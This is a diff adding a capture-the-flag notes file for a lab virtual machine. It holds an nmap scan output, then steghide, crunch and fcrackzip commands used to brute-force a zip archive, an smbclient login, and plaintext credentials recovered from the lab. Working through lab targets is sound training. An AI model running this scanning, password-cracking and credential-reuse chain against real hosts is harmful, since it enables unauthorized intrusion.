@@ -1,0 +1,91 @@
+hack@kali:~$ nmap -A -p- 192.168.1.67
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-22 20:31 CET
+Nmap scan report for sahu-VirtualBox.homenet.telecomitalia.it (192.168.1.67)
+Host is up (0.00045s latency).
+Not shown: 65530 closed ports
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 0        0             230 Jan 30 13:55 ftp.zip
+| ftp-syst:                                                                                        
+|   STAT:                                                                                          
+| FTP server status:                                                                               
+|      Connected to ::ffff:192.168.1.56                                                            
+|      Logged in as ftp                                                                            
+|      TYPE: ASCII                                                                                 
+|      No session bandwidth limit                                                                  
+|      Session timeout in seconds is 300                                                           
+|      Control connection is plain text                                                            
+|      Data connections will be plain text                                                         
+|      At session startup, client count was 4                                                      
+|      vsFTPd 3.0.3 - secure, fast, stable                                                         
+|_End of status
+22/tcp  open  ssh         OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 e2:78:c5:73:f2:86:cb:cb:02:7f:b6:72:85:61:ac:91 (RSA)
+|   256 22:1a:ee:1a:98:4f:32:e7:dc:30:43:52:2c:b2:24:06 (ECDSA)
+|_  256 1a:9b:28:b3:ad:58:32:e9:6c:f3:ea:3b:cf:6b:08:ad (ED25519)
+80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Site doesn't have a title.
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAHU)
+445/tcp open  netbios-ssn Samba smbd 4.10.7-Ubuntu (workgroup: SAHU)
+Service Info: Host: SAHU-VIRTUALBOX; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: -1h49m59s, deviation: 3h10m31s, median: 0s
+|_nbstat: NetBIOS name: SAHU-VIRTUALBOX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.10.7-Ubuntu)
+|   Computer name: sahu-virtualbox
+|   NetBIOS computer name: SAHU-VIRTUALBOX\x00
+|   Domain name: \x00
+|   FQDN: sahu-virtualbox
+|_  System time: 2020-03-23T01:02:17+05:30
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-03-22T19:32:17
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 32.76 seconds
+
+
+
+
+hack@kali:~/CTF/sahu$ steghide --extract -sf Haryana-1-1.jpg 
+
+
+
+hack@kali:~/CTF/sahu$ crunch 6 6 -t 5AHU@@ -f /usr/share/crunch/charset.lst mixalpha-numeric-all-space-sv -o wordlist.txt
+
+
+
+hack@kali:~/CTF/sahu$ fcrackzip -u -D -p wordlist.txt ftp.zip 
+
+
+
+
+hack@kali:~/CTF/sahu$ cat ftp.txt 
+
+      USERNAME = sahu
+      PASSWORD = sahu14216   ssh users list
+
+
+smbclient //192.168.1.67/sambashare -U sahu -p
+ssh.txt from smb
+
+   USERNAME = haryana
+   PASSWORD = hralltime
+
+
+
+
+
